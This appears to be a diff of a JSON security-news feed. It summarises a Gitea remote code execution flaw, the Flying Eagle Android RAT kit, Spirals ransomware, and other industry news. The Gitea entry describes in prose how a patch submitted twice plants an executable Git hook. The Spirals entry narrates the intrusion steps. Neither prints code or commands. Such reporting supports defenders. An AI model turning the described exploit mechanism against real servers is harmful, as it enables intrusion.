+    "article_text": "Gitea, the self-hosted Git platform, has patched a critical remote code execution vulnerability. A user with ordinary repository write access can turn attacker-controlled patch content into a live Git hook and run shell commands as the Gitea service account. Tracked as CVE-2026-60004 (CVSS score: 9.8), the flaw affects Gitea versions 1.17 and later before 1.27.1 and is fixed in 1.27.1. The vulnerable API call requires authentication and repository write permission. But Gitea enables registration by default, so an outside visitor can create a normal account and repository on an unchanged installation, then exploit the bug without pre-existing credentials. Upgrading to 1.27.1 is the fix. Gitea said on July 27 that Gitea Cloud instances would be upgraded automatically. Gitea's July 28 advisory does not say the flaw has been exploited in the wild, but it includes public proof-of-concept (PoC) code. Disabling open registration can remove the public account-creation path while the update is deployed, but it does not fix the flaw or protect against existing users with repository write access. The flaw was reported by security researcher Shai Rod, who goes by NightRang3r . Gitea credits NightRang3r as the reporter in its advisory. Gitea's affected route invokes reqToken() , which rejects requests without a signed-in user. The no-prior-credentials path comes from the project's default configuration , which leaves registration open, requires neither email nor manual approval, does not mark new users as restricted, and imposes no default repository-creation limit. The bug sits in the POST /api/v1/repos/{owner}/{repo}/diffpatch endpoint. According to Gitea's security advisory , the endpoint applies a supplied patch inside a shared bare temporary clone. Vulnerable builds invoke git apply with --index , --recount , --cached , and --binary , adding the -3 three-way fallback option when the server runs Git 2.32 or later. An attacker submits the same patch twice to create an add/add collision. The three-way fallback then checks the indexed path out even though the operation uses --cached . Because the temporary clone is bare, its root is $GIT_DIR . An executable file placed at hooks/post-index-change therefore lands in Git's hook directory and becomes active. Git runs it while updating the index. The PoC signs in with a normal account, creates an initialized private repository, sends the malicious patch twice, and retrieves the command output. It needs no outbound callback. The hook stores the output in Git objects, creates a branch containing the result, and lets the attacker fetch it over authenticated smart HTTP. As of July 29, 2026, none of the cited primary sources reports whether the flaw was exploited before or after version 1.27.1 became available. Successful exploitation gives the attacker the privileges of the Gitea operating-system account. Depending on how the instance is isolated, Gitea said that could expose application and environment secrets, mounted repositories, database credentials and contents, OAuth credentials, and reachable internal services. Exploitation still requires repository write access, Git 2.32 or later, an enabled diffpatch route, and a writable, executable temporary filesystem. Default registration lets an outsider obtain the required write access on an unchanged installation. The fix is easy to miss in the changelog. Gitea changed the temporary clone from bare to non-bare. The code comment explicitly warns that Git commands using --index may operate on the working tree. The change was merged and backported on July 26, 2026. Version 1.27.1 shipped on July 27, and the security advisory followed on July 28. The release notes listed the change under MISC as \"refactor: git patch apply,\" not under SECURITY. Rod had previewed the RCE alongside a separate file-inclusion issue , with a PoC retrieving /etc/passwd from a Gitea 1.27.0 host. That issue appears to correspond to a separate change included in 1.27.1 that altered Gitea's Org-mode renderer so #+INCLUDE paths are returned as plain text instead of being read from the server's filesystem. Gitea has not published a separate advisory or CVE for the file-inclusion issue. Learn how 300 enterprise leaders are managing AI-driven open-source risk, remediation debt, and governance at scale. Learn how to govern risk, secure AI-built software, and keep control as development moves at machine speed. Get the latest news, expert insights, exclusive resources, and st",
+    "quick_summary": [
+      "Gitea, the self-hosted Git platform, has patched a critical remote code execution vulnerability.",
+      "Risk: credentials/infostealer risk, vulnerability/exploitation risk",
+      "Action: check affected products, patch status, and exposed services."
+    ],
+    "link": "https://thehackernews.com/2026/07/new-gitea-rce-lets-repository-writers.html",
+    "target": "Gitea RCE Lets Repository",
+    "type": "Vulnerability",
+    "severity": "Critical",
+    "sources": [
+      "The Hacker News"
+    ],
+    "links": [
+      {
+        "source": "The Hacker News",
+        "url": "https://thehackernews.com/2026/07/new-gitea-rce-lets-repository-writers.html"
+      }
+    ]
+  },
+  {
+    "id": "c294620d7f1ef722",
+    "date": "2026-07-29T07:32:37+00:00",
+    "source": "SANS ISC",
+    "quality": "High",
+    "scope": "Research",
+    "category": "",
+    "title": "Apple Patches Everything (July 2026), (Wed, Jul 29th)",
+    "summary": "I am a bit late with this summary, but this week Apple released updates to all its operating systems and Safari. The Safari update, as usual, targets macOS prior to macOS 26. macOS updates covered the two older versions (14 and 15), while other operating system patches only covered the current 26 versions.",
+    "article_text": "",
+    "quick_summary": [
+      "I am a bit late with this summary, but this week Apple released updates to all its operating systems and Safari.",
+      "Risk: general cybersecurity update",
+      "Action: check affected products, patch status, and exposed services."
+    ],
+    "link": "https://isc.sans.edu/diary/rss/33196",
+    "target": "Apple Patches Everything July",
+    "type": "Vulnerability",
+    "severity": "Medium",
+    "sources": [
+      "SANS ISC"
+    ],
+    "links": [
+      {
+        "source": "SANS ISC",
+        "url": "https://isc.sans.edu/diary/rss/33196"
+      }
+    ]
+  },
+  {
+    "id": "40f96c178b5af650",
+    "date": "2026-07-29T07:07:23+00:00",
+    "source": "The Hacker News",
+    "quality": "High",
+    "scope": "General",
+    "category": "",
+    "title": "Flying Eagle Android RAT Traces Found on 170 Servers as Source Code Circulates",
+    "summary": "Source code for the Flying Eagle Android remote access trojan (RAT) framework is circulating through criminal Telegram channels. Hunt.io and independent researcher NetAskari traced matching control panels and certificates to 170 internet servers. They linked the framework to a fake \"公安一网通办\" Public Security service application targeting Android users in China. The kit supports payment-password",
+    "article_text": "Source code for the Flying Eagle Android remote access trojan (RAT) framework is circulating through criminal Telegram channels. Hunt.io and independent researcher NetAskari traced matching control panels and certificates to 170 internet servers. They linked the framework to a fake \"公安一网通办\" Public Security service application targeting Android users in China. The kit supports payment-password and keystroke capture, screen recording, camera access, and phishing prompts for financial, adult-content, and government-service applications. Hunt.io's search of the preceding 30 days of telemetry found infrastructure fingerprints on 170 servers, a count that does not establish 170 infected phones, victims, operators, or confirmed command-and-control (C2) systems. The researchers found 158 servers through the AdminPro page title, HTTPS redirect behaviour, and matching response headers, then identified 12 more through a default certificate packaged with Flying Eagle. They said the total is likely conservative because it excluded otherwise similar servers that did not return the expected 302 redirect. Chinese authorities advised anyone who installed the fraudulent application to remove it, scan the device, change affected account passwords, freeze payment channels if funds moved, and report the incident to police. China's National Cybersecurity Notification Center warned on June 18 that the fake application was being distributed from 110gongan[.]com, associated with 207.56.30[.]188, and could steal payment data and remotely control devices. According to joint research published July 28, the Flying Eagle code was distributed as a 388 MB archive called 中国龙.zip , or Chinese Dragon . It contains a full Docker deployment with nginx, PHP, MySQL, a Node.js WebSocket server, Android build tools, phishing templates, and a default Transport Layer Security certificate. The panel lets an operator choose an app name, icon, lure text, and C2 address, then produces a signed APK from one of two templates. The builder randomises package and class names, encrypts embedded C2 URLs using AES-128-CBC, and adds 2.8 MB to 3.5 MB of low-entropy JSON padding designed to resemble legitimate software development kit configuration data. Flying Eagle is the builder and control framework; Hunt.io said samples it analysed from the builder were detected as SpyNote and used Android accessibility services for privilege escalation and gesture injection. The researchers observed two Telegram channels, SQLRCE0 and Yx Technology, distributing modified versions of the framework. Messages reviewed by them claimed an unidentified party had compromised customer infrastructure containing 189 Flying Eagle servers and exfiltrated database data, but neither claim has been independently confirmed. Yx Technology also advertised cash-out services charging 20% to 50% of the transaction value. The server count and the source-code circulation are documented, but no causal relationship between them has been established. SQLRCE0 introduced a separate Android control kit called Night Dragon on June 23, 2026. The researchers found two associated servers and an exposed panel that listed 46 devices as online and 29 as actively connected, but said it could not determine whether the entries represented victims or test data. Hunt.io says Night Dragon appears to be an independent build, with a second version in development as of July 12. The report establishes that SQLRCE0 distributed Flying Eagle and promoted Night Dragon, but it does not establish shared code. This is not the 2011 China-linked espionage campaign McAfee named Night Dragon . The 2026 kit is financially motivated Android crimeware. Learn how 300 enterprise leaders are managing AI-driven open-source risk, remediation debt, and governance at scale. Learn how to govern risk, secure AI-built software, and keep control as development moves at machine speed. Get the latest news, expert insights, exclusive resources, and strategies from industry leaders, all for free.",
+    "quick_summary": [
+      "Source code for the Flying Eagle Android remote access trojan (RAT) framework is circulating through criminal Telegram channels.",
+      "Risk: credentials/infostealer risk, vulnerability/exploitation risk",
+      "Action: check affected products, patch status, and exposed services."
+    ],
+    "link": "https://thehackernews.com/2026/07/flying-eagle-android-rat-traces-found.html",
+    "target": "Flying Eagle Android RAT",
+    "type": "Data Leak / Breach",
+    "severity": "Critical",
+    "sources": [
+      "The Hacker News",
+      "Reddit r/netsec"
+    ],
+    "links": [
+      {
+        "source": "The Hacker News",
+        "url": "https://thehackernews.com/2026/07/flying-eagle-android-rat-traces-found.html"
+      },
+      {
+        "source": "Reddit r/netsec",
+        "url": "https://www.reddit.com/r/netsec/comments/1v95msb/flying_eagle_android_rat_tls_certificate_pivots/"
+      }
+    ]
+  },
+  {
+    "id": "cfa1358b98e43732",
+    "date": "2026-07-29T06:45:08.961796+00:00",
+    "source": "DeafNews",
+    "quality": "Medium",
+    "scope": "Research",
+    "category": "",
+    "title": "CRITICAL BRICKSTORM: Chinese Backdoor Targets US and Canadian Critical Infrastructure",
+    "summary": "Discovered from DeafNews page. Open full article for more details.",
+    "article_text": "",
+    "quick_summary": [
+      "Open full article for more details.",
+      "Risk: general cybersecurity update",
+      "Action: read full article if the vendor/customer/environment is relevant."
+    ],
+    "link": "https://deafnews.it/en/news/malware/brickstorm-chinese-backdoor-targets-us-and-canadian-critical-infrastructure",
+    "target": "CRITICAL BRICKSTORM",
+    "type": "Malware",
+    "severity": "Critical",
+    "sources": [
+      "DeafNews"
+    ],
+    "links": [
+      {
+        "source": "DeafNews",
+        "url": "https://deafnews.it/en/news/malware/brickstorm-chinese-backdoor-targets-us-and-canadian-critical-infrastructure"
+      }
+    ]
+  },
+  {
+    "id": "0919186d39a8aaac",
+    "date": "2026-07-29T06:45:08.961193+00:00",
+    "source": "DeafNews",
+    "quality": "Medium",
+    "scope": "Research",
+    "category": "",
+    "title": "Spirals: New Rust Ransomware Deployed Across Enterprise Network in Under 24 Hours ransomware",
+    "summary": "A new ransomware actor called Spirals completed a corporate intrusion, from initial access to data theft and encryption, in less than 24 hours. [...]",
+    "article_text": "A new ransomware actor called Spirals completed a corporate intrusion, from initial access to data theft and encryption, in less than 24 hours. The attack occurred in June and breached an IT services firm in South Asia after compromising an Internet Information Services (IIS) server exposed on the public web. Researchers at Symantec's Threat Hunter Team say that the attacker moved quickly after obtaining initial access and uploading an ASP.NET web shell. The Spirals operator then bypassed User Account Control (UAC), enabled Remote Desktop, and created a local account to maintain persistent access. The attacker also dumped the SAM registry hive and LSASS process memory in an attempt to extract credentials. Symantec investigators say that the threat actor tried to remove security software on the hosts, used WMI to move laterally to more than a dozen systems, and established redundant remote access channels using revsocks, Chisel, and Cloudflare tunnels. A PowerShell payload disabled Microsoft Defender, removed its threat definitions, and stopped services associated with 23 backup, database, and virtualization products, including Veeam, VMware, Hyper-V, SQL Server, Oracle, and PostgreSQL, in preparation for the encryption stage. The deployment of the Spirals payload (bitsadmin.exe) occurred less than 24 hours after the initial compromise, reports Symantec. “The operator began deploying the ransomware payload across the victim’s network using PsExec running as SYSTEM,” the researchers explain . “The payload was named bitsadmin.exe, likely to masquerade as the legitimate Windows utility associated with the Background Intelligent Transfer Service, encrypting files on impacted machines.” Spirals is a Rust-based ransomware family that uses AES-128 keys protected by an attacker-controlled ECDH P-256 public key. The ransomware uses intermittent encryption for files larger than 5MB to accelerate the process. A ransom note named RECOVERY_SECTION.log is dropped on the C:\\ drive, containing instructions to negotiate a ransom. Victims are threatened with public exposure of the stolen data within six days, unless the attacker is paid. Despite the presence of the extortion portal, Symantec observed Spirals in a single case so far, so it’s unclear whether the new family is intended for broader cybercrime deployment or if it was a custom payload created specifically for this attack at the IT services firm. Symantec's report provides network indicators and file hashes associated with the documented Spirals attack to help organizations worldwide set up defenses against this threat group. Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. New Prinz Eugen ransomware prioritizes recent files for encryption JadePuffer ransomware used AI agent to automate entire attack Blackfield ransomware asks Nidec Corporation for $2 million ransom US charges alleged operators of Russian bulletproof hosting service US sanctions VPN, malware providers for enabling ransomware attacks Microsoft July 2026 Patch Tuesday fixes massive 570 flaws, 3 zero-days Microsoft: Some Dell PCs shut down after recent Windows updates Windows 11 KB5101650 & KB5099414 cumulative updates released AI broke vulnerability management. Get the guide CISOs use to shift budget to BAS. See how Pixellot discovered and secured hundreds of unmanaged AI agent identities in weeks, not months. Read the case study. How Mature Is Your AI Security Program? Take the Free AI Maturity Assessment. Pentest your web apps on-demand. Find what humans miss. Scope and launch a pentest in minutes. Read our posting guidelinese to learn what content is prohibited.",
+    "quick_summary": [
+      "Open full article for more details.",
+      "Risk: ransomware/extortion",
+      "Action: monitor indicators, backups, remote access, and related vendor exposure."
+    ],
+    "link": "https://deafnews.it/en/news/ransomware/spirals-new-rust-ransomware-deployed-across-enterprise-network-in-under-24-hours",
+    "target": "Spirals",
+    "type": "Ransomware",
+    "severity": "Critical",
+    "sources": [
+      "DeafNews"
+    ],
+    "links": [
+      {
+        "source": "DeafNews",
+        "url": "https://deafnews.it/en/news/ransomware/spirals-new-rust-ransomware-deployed-across-enterprise-network-in-under-24-hours"
+      },
+      {
+        "source": "BleepingComputer",
+        "url": "https://www.bleepingcomputer.com/news/security/new-spirals-ransomware-encrypts-victim-network-in-under-24-hours/"
+      }
+    ]
+  },
+  {
+    "id": "104efe13220b2918",
+    "date": "2026-07-29T06:45:08.961075+00:00",
+    "source": "DeafNews",
+    "quality": "Medium",
+    "scope": "Research",
+    "category": "",
+    "title": "Hotel Wi-Fi DNS Attacks Steal Microsoft 365 Accounts, Bypass MFA CYBERSEC",
+    "summary": "Discovered from DeafNews page. Open full article for more details.",
+    "article_text": "",
+    "quick_summary": [
+      "Open full article for more details.",
+      "Risk: ISNET vendor relevance",
+      "Action: read full article if the vendor/customer/environment is relevant."
+    ],
+    "link": "https://deafnews.it/en/news/cybersecurity/hotel-wi-fi-dns-attacks-steal-microsoft-365-accounts-bypass-mfa",
+    "target": "Hotel Wi-Fi DNS Steal",
+    "type": "General Cybersecurity",
+    "severity": "Low",
+    "sources": [
+      "DeafNews"
+    ],
+    "links": [
+      {
+        "source": "DeafNews",
+        "url": "https://deafnews.it/en/news/cybersecurity/hotel-wi-fi-dns-attacks-steal-microsoft-365-accounts-bypass-mfa"
+      }
+    ]
+  },
+  {
+    "id": "db755cd0f502e63b",
+    "date": "2026-07-29T06:45:05.367453+00:00",
+    "source": "TechNadu",
+    "quality": "Medium",
+    "scope": "General",
+    "category": "",
+    "title": "HermeticReader Flaw (CVE-2026-48294) in Adobe's Acrobat Extension Exposed WhatsApp Chats to Any Website",
+    "summary": "Discovered from TechNadu page. Open full article for more details.",
+    "article_text": "",
+    "quick_summary": [
+      "Open full article for more details.",
+      "Risk: vulnerability/exploitation risk",
+      "Action: check affected products, patch status, and exposed services."
+    ],
+    "link": "https://www.technadu.com/hermeticreader-flaw-cve-2026-48294-in-adobes-acrobat-extension-exposed-whatsapp-chats-to-any-website/631742/",
+    "target": "HermeticReader CVE-2026-48294 Adobes Acrobat",
+    "type": "Data Leak / Breach",
+    "severity": "Medium",
+    "sources": [
+      "TechNadu"
+    ],
+    "links": [
+      {
+        "source": "TechNadu",
+        "url": "https://www.technadu.com/hermeticreader-flaw-cve-2026-48294-in-adobes-acrobat-extension-exposed-whatsapp-chats-to-any-website/631742/"
       }
     ]
   },
@@ -3031,35 +3529,6 @@
       {
         "source": "Reddit r/netsec",
         "url": "https://www.reddit.com/r/netsec/comments/1v8vb4p/the_state_of_vibecoded_app_security_my_analysis/"
-      }
-    ]
-  },
-  {
-    "id": "2905609ebb9bdfdf",
-    "date": "2026-07-28T18:45:17.435190+00:00",
-    "source": "Reddit r/netsec",
-    "quality": "Medium",
-    "scope": "Community",
-    "category": "",
-    "title": "Flying Eagle Android RAT: TLS Certificate Pivots, Panel Fingerprints, and 170 Servers Across Hong Kong ASNs",
-    "summary": "",
-    "article_text": "",
-    "quick_summary": [
-      "Flying Eagle Android RAT: TLS Certificate Pivots, Panel Fingerprints, and 170 Servers Across Hong Kong ASNs",
-      "Risk: general cybersecurity update",
-      "Action: read full article if the vendor/customer/environment is relevant."
-    ],
-    "link": "https://www.reddit.com/r/netsec/comments/1v95msb/flying_eagle_android_rat_tls_certificate_pivots/",
-    "target": "Flying Eagle Android RAT",
-    "type": "General Cybersecurity",
-    "severity": "Low",
-    "sources": [
-      "Reddit r/netsec"
-    ],
-    "links": [
-      {
-        "source": "Reddit r/netsec",
-        "url": "https://www.reddit.com/r/netsec/comments/1v95msb/flying_eagle_android_rat_tls_certificate_pivots/"
       }
     ]
   },
@@ -26081,470 +26550,6 @@
       {
         "source": "The Record",
         "url": "https://therecord.media/ukraine-acting-defense-minister-yevhenii-khmara"
-      }
-    ]
-  },
-  {
-    "id": "887e2197f87b0c6e",
-    "date": "2026-07-17T12:11:22+00:00",
-    "source": "SecurityWeek",
-    "quality": "High",
-    "scope": "General",
-    "category": "",
-    "title": "Podcast: Broken Governance, Agentic AI, and the MindStone Agent Exclusive",
-    "summary": "(Video) Artificial intelligence is transforming cybersecurity, but are governance, compliance, and security practices evolving fast enough to keep up? The post Podcast: Broken Governance, Agentic AI, and the MindStone Agent Exclusive appeared first on SecurityWeek .",
-    "article_text": "",
-    "quick_summary": [
-      "(Video) Artificial intelligence is transforming cybersecurity, but are governance, compliance, and security practices evolving fast enough to keep up?",
-      "Risk: general cybersecurity update",
-      "Action: read full article if the vendor/customer/environment is relevant."
-    ],
-    "link": "https://www.securityweek.com/podcast-broken-governance-agentic-ai-and-the-mindstone-agent-exclusive/",
-    "target": "Podcast",
-    "type": "General Cybersecurity",
-    "severity": "Low",
-    "sources": [
-      "SecurityWeek"
-    ],
-    "links": [
-      {
-        "source": "SecurityWeek",
-        "url": "https://www.securityweek.com/podcast-broken-governance-agentic-ai-and-the-mindstone-agent-exclusive/"
-      }
-    ]
-  },
-  {
-    "id": "616be5dc21ad8558",
-    "date": "2026-07-17T11:50:25+00:00",
-    "source": "Dark Reading",
-    "quality": "High",
-    "scope": "General",
-    "category": "",
-    "title": "Google Bets 'Agentic Defense' Strategy Can Outpace Attackers",
-    "summary": "Google Cloud incorporates key Wiz capabilities into an agentic defense platform to automate threat detection and remediation against AI attacks.",
-    "article_text": "",
-    "quick_summary": [
-      "Google Cloud incorporates key Wiz capabilities into an agentic defense platform to automate threat detection and remediation against AI attacks.",
-      "Risk: general cybersecurity update",
-      "Action: read full article if the vendor/customer/environment is relevant."
-    ],
-    "link": "https://www.darkreading.com/cloud-security/google-bets-agentic-defense-strategy-outpace-attackers",
-    "target": "Google Bets Agentic Defense",
-    "type": "General Cybersecurity",
-    "severity": "Low",
-    "sources": [
-      "Dark Reading"
-    ],
-    "links": [
-      {
-        "source": "Dark Reading",
-        "url": "https://www.darkreading.com/cloud-security/google-bets-agentic-defense-strategy-outpace-attackers"
-      }
-    ]
-  },
-  {
-    "id": "80f635e2550de376",
-    "date": "2026-07-17T11:44:41+00:00",
-    "source": "The Hacker News",
-    "quality": "High",
-    "scope": "General",
-    "category": "",
-    "title": "E.U. Orders Google to Open Android Mic, Camera and Screen to Rival AI Assistants",
-    "summary": "The European Commission on Thursday ordered Google to give rival AI assistants the same reach into Android that Gemini already has: the camera, the microphone, whatever is on screen, a wake word that fires with the display off, and the ability to drive other apps in the background by imitating taps and typing. Google has to ship it in the next major release, Android 18, and by 1 August 2027 at",
-    "article_text": "The European Commission on Thursday ordered Google to give rival AI assistants the same reach into Android that Gemini already has: the camera, the microphone, whatever is on screen, a wake word that fires with the display off, and the ability to drive other apps in the background by imitating taps and typing. Google has to ship it in the next major release, Android 18, and by 1 August 2027 at the latest. That is one of two binding specification decisions adopted on 16 July under the Digital Markets Act, six months after the Commission opened proceedings on 27 January. The second makes Google hand anonymised Search query, click, and ranking data to rival search engines, and to AI chatbots that do search, for a cost-based fee. Neither is a fine. Specification proceedings only say what a gatekeeper has to build; the Commission's separate power to open a non-compliance case , fines included, is untouched. Android carries around 60% of European mobile users. The Android decision covers 11 operating system features . Google may demand certification before an app touches five of them, which the published measures call restricted features: Paragraph 55 spells the third one out, and it points straight at Google's own apps. A certified assistant gets to retrieve and draft Gmail, create and manage Calendar events, pull content out of Drive and Docs, trigger Maps navigation, control YouTube playback and query watch history, read and write SMS, MMS, and RCS in Messages, and place phone calls. The other six carry no certification requirement at all: ambient data, always-on hotword detection, long-press invocation, the system-level on-device models, third-party model implementation, and background execution. Paragraph 119 opens them to all third parties, user-installed apps included, and bars Google from restricting the type or use case of the app that calls them. Ambient data means microphone input, system audio, camera, screen contents, location, and sensors such as the accelerometer, continuously and in the background, under the same consent prompts that Google's own AI services get. Those prompts are the light ones: the Commission's case summary notes that Google's first-party services reach the sensors today with reduced consent processes and privacy indicators, while third parties get runtime consent per use. Hotword detection rides the low-power DSP, so it survives a locked screen and battery saver, and can keep recording until the user ends the request. That one only reaches phones already carrying the chip. Letting several assistants listen at once slips to Android 19 and 1 August 2028. Consent still gates all of it, and Google can still require process isolation and encryption. What it cannot do, for these six, is decide who is allowed to ask. If it wants the raw sensor feed behind a gate, the measures leave it a route: file a reasoned request showing good cause, and the Commission may move the feature onto the restricted list. For the gated five, Google has to set up a Qualified AI Assistant Programme, let third-party Trusted Certification Authorities certify assistants into it free of charge, accept those certifications without bolting on conditions, and never revoke them. It also writes the TCA programme's terms and decides who gets approved as a certifier, on terms that have to be reasonable and non-discriminatory, and that it has to clear with the Commission two months before changing. So it cannot revoke a TCA's certification of an assistant. It can revoke the TCA. The bar itself is capped. Google may test whether an assistant reconfirms user intent before sensitive or irreversible actions, whether it minimises inadvertent data disclosure, whether it clears baseline mobile app security, and whether it is hardened against agentic risks that would negate user intent. The measures offer input, supply chain, integration, model integrity and infrastructure as examples of those. Anything past that needs the Commission first, and the same conditions bind Gemini. Suspension is narrow: Google needs a consistent body of evidence of practices causing severe and immediate harm, and it has to hand that evidence to the Commission and the certification authorities. Appeals get an answer within a month. There is also a door around the gate. Paragraph 135 makes Google let users consent their way out of the certification requirement, per service, per device, without burying the switch behind developer mode. Draft terms are due 1 Feb",
-    "quick_summary": [
-      "The European Commission on Thursday ordered Google to give rival AI assistants the same reach into Android that Gemini already has: the camera, the microphone, whatever is on screen, a wake word that fires with the displ",
-      "Risk: general cybersecurity update",
-      "Action: read full article if the vendor/customer/environment is relevant."
-    ],
-    "link": "https://thehackernews.com/2026/07/eu-orders-google-to-open-android-mic.html",
-    "target": "E.U. Orders Google Open",
-    "type": "General Cybersecurity",
-    "severity": "Critical",
-    "sources": [
-      "The Hacker News"
-    ],
-    "links": [
-      {
-        "source": "The Hacker News",
-        "url": "https://thehackernews.com/2026/07/eu-orders-google-to-open-android-mic.html"
-      }
-    ]
-  },
-  {
-    "id": "3625a848ea153486",
-    "date": "2026-07-17T11:43:36+00:00",
-    "source": "SecurityWeek",
-    "quality": "High",
-    "scope": "General",
-    "category": "",
-    "title": "Beacon Security Raises $13 Million for Security Data Platform",
-    "summary": "The startup helps organizations detect, hunt, and protect their assets across environments at machine speed. The post Beacon Security Raises $13 Million for Security Data Platform appeared first on SecurityWeek .",
-    "article_text": "",
-    "quick_summary": [
-      "The startup helps organizations detect, hunt, and protect their assets across environments at machine speed.",
-      "Risk: general cybersecurity update",
-      "Action: read full article if the vendor/customer/environment is relevant."
-    ],
-    "link": "https://www.securityweek.com/beacon-security-raises-13-million-for-security-data-platform/",
-    "target": "Beacon Raises Million Data",
-    "type": "General Cybersecurity",
-    "severity": "Low",
-    "sources": [
-      "SecurityWeek"
-    ],
-    "links": [
-      {
-        "source": "SecurityWeek",
-        "url": "https://www.securityweek.com/beacon-security-raises-13-million-for-security-data-platform/"
-      }
-    ]
-  },
-  {
-    "id": "a418af851b376002",
-    "date": "2026-07-17T11:40:32.120681+00:00",
-    "source": "Reddit r/netsec",
-    "quality": "Medium",
-    "scope": "Community",
-    "category": "",
-    "title": "FIFA was saved this time",
-    "summary": "",
-    "article_text": "",
-    "quick_summary": [
-      "FIFA was saved this time",
-      "Risk: general cybersecurity update",
-      "Action: read full article if the vendor/customer/environment is relevant."
-    ],
-    "link": "https://www.reddit.com/r/netsec/comments/1ulmoyx/fifa_was_saved_this_time/",
-    "target": "FIFA",
-    "type": "General Cybersecurity",
-    "severity": "Low",
-    "sources": [
-      "Reddit r/netsec"
-    ],
-    "links": [
-      {
-        "source": "Reddit r/netsec",
-        "url": "https://www.reddit.com/r/netsec/comments/1ulmoyx/fifa_was_saved_this_time/"
-      }
-    ]
-  },
-  {
-    "id": "0b98f18057df37d3",
-    "date": "2026-07-17T11:30:00+00:00",
-    "source": "The Hacker News",
-    "quality": "High",
-    "scope": "General",
-    "category": "",
-    "title": "The Race to Field Military Autonomy Is On, Can Trusted Information Infrastructure Keep Pace?",
-    "summary": "Military forces are under increasing pressure to field autonomous capabilities faster than ever before. Across the U.S., UK, and NATO, new investment, evolving defense strategies, and accelerated acquisition pathways are transforming how capability is delivered, rewarding programs that can move from concept to operational deployment at commercial speed. Now the focus shifts to the trusted",
-    "article_text": "Military forces are under increasing pressure to field autonomous capabilities faster than ever before. Across the U.S., UK, and NATO, new investment, evolving defense strategies, and accelerated acquisition pathways are transforming how capability is delivered, rewarding programs that can move from concept to operational deployment at commercial speed. Now the focus shifts to the trusted information infrastructure that allows them to operate together at mission speed. As autonomous aircraft, uncrewed maritime vessels, ground systems, satellites and AI-enabled mission applications become increasingly connected, so too does the information that powers them. Telemetry, ISR, command data, AI outputs, sensor-to-shooter workflows and coalition intelligence all need to move seamlessly across platforms, domains, and partners. The future force won't be defined by autonomous systems alone, it will be defined by the trusted information infrastructure that connects them. The momentum behind military autonomy is undeniable. The U.S. Department of War has established dedicated leadership to accelerate unmanned capability. NSPM-11 reinforces the strategic importance of AI across the National Security enterprise. The proposed FY27 defense budget continues significant investment in autonomous capability and defense modernization. In the UK, the Strategic Defence Review and Defence Investment Plan place autonomous systems at the center of the future force design, backed by more than £5 billion of investment over the next four years. Programs are already expanding autonomous testing and experimentation, while AUKUS Pillar II and NATO initiatives continue to accelerate allied collaboration on autonomy and advanced defense technologies. Together, these developments point to a marked acceleration in Western investment in military autonomy. For program leaders, the direction is clear; field capability faster, integrate commercial innovation sooner and deliver operational advantage without compromising mission effectiveness. Much of the conversation around military autonomy still focuses on platforms. These are important questions, but they are only part of the full picture. Autonomous capability delivers its greatest value when it operates as part of a connected mission. Every autonomous system must exchange trusted information with operators, AI applications, command environments, and coalition partners. Mission data rarely stays within a single platform, network, or classification. As programs accelerate adoption, the opportunity shifts from simply deploying more autonomous systems to enabling those systems to operate together with confidence. The acceleration of defense innovation is changing expectations across government and industry. Programs are increasingly adopting commercial technologies through rapid acquisition pathways, adaptive procurement and iterative delivery models. The ability to field capability faster is becoming a strategic advantage in its own right. However, commercial speed shouldn't always require bespoke information architectures that take years to integrate before operational capability can be realized. Trusted information infrastructure should enable programs to adopt autonomous capability at the same pace and flexibility that modern defense demands. That requires infrastructure designed to move trusted mission information securely across platforms, classifications, and coalition environments from the outset, not added later as a separate integration effort. As autonomous missions become increasingly software-defined, programs have an opportunity to rethink how trust is established across mission-critical environments. Software will continue to play a critical role across autonomous capability, AI, and mission systems. At the same time, defense has long relied on another solution in its highest assurance environments, enforcing separation in hardware. Hardware-enforced separation (hardsec) establishes trust within hardware logic rather than solely relying on software controls. Removing the operating system from the trust boundary reduces the architecture complexity while supporting the movement of trusted information across secure environments. This approach has protected some of the defense's most critical environments for years. Today, it provides a foundation that aligns naturally with the speed and scale of autonomous transformation. Rather than slowing innovation, purpose-built information infrastructure ",
-    "quick_summary": [
-      "Military forces are under increasing pressure to field autonomous capabilities faster than ever before.",
-      "Risk: vulnerability/exploitation risk",
-      "Action: check affected products, patch status, and exposed services."
-    ],
-    "link": "https://thehackernews.com/2026/07/the-race-to-field-military-autonomy-is.html",
-    "target": "Race Field Military Autonomy",
-    "type": "Vulnerability",
-    "severity": "Critical",
-    "sources": [
-      "The Hacker News"
-    ],
-    "links": [
-      {
-        "source": "The Hacker News",
-        "url": "https://thehackernews.com/2026/07/the-race-to-field-military-autonomy-is.html"
-      }
-    ]
-  },
-  {
-    "id": "d2087d082f957347",
-    "date": "2026-07-17T11:08:04+00:00",
-    "source": "SecurityWeek",
-    "quality": "High",
-    "scope": "General",
-    "category": "",
-    "title": "Industry Reactions to Pentagon Suspending CMMC Phase 2: Feedback Friday",
-    "summary": "Industry professionals broadly agree that the suspension pauses third-party CMMC audits but not the underlying legal obligation to protect CUI. The post Industry Reactions to Pentagon Suspending CMMC Phase 2: Feedback Friday appeared first on SecurityWeek .",
-    "article_text": "",
-    "quick_summary": [
-      "Industry professionals broadly agree that the suspension pauses third-party CMMC audits but not the underlying legal obligation to protect CUI.",
-      "Risk: general cybersecurity update",
-      "Action: read full article if the vendor/customer/environment is relevant."
-    ],
-    "link": "https://www.securityweek.com/industry-reactions-to-pentagon-suspending-cmmc-phase-2-feedback-friday/",
-    "target": "Industry Reactions Pentagon Suspending",
-    "type": "General Cybersecurity",
-    "severity": "Low",
-    "sources": [
-      "SecurityWeek"
-    ],
-    "links": [
-      {
-        "source": "SecurityWeek",
-        "url": "https://www.securityweek.com/industry-reactions-to-pentagon-suspending-cmmc-phase-2-feedback-friday/"
-      }
-    ]
-  },
-  {
-    "id": "7992a2cfe9aa3ae8",
-    "date": "2026-07-17T10:53:31+00:00",
-    "source": "The Hacker News",
-    "quality": "High",
-    "scope": "General",
-    "category": "",
-    "title": "Armenia Detains Russian Tourist on U.S. Warrant for REvil Hacker, Lawyers Say Wrong Man",
-    "summary": "Armenia has held a Russian tourist named Aleksandr Ermakov in a detention center since June 28, on a U.S. extradition request for a REvil ransomware suspect named Aleksandr Ermakov. His wife, Maria Yurova, told REN TV that border officers pulled him out of the departure hall at Yerevan's Zvartnots airport, held up a phone with a photo of him off his VKontakte page, and walked him into a side",
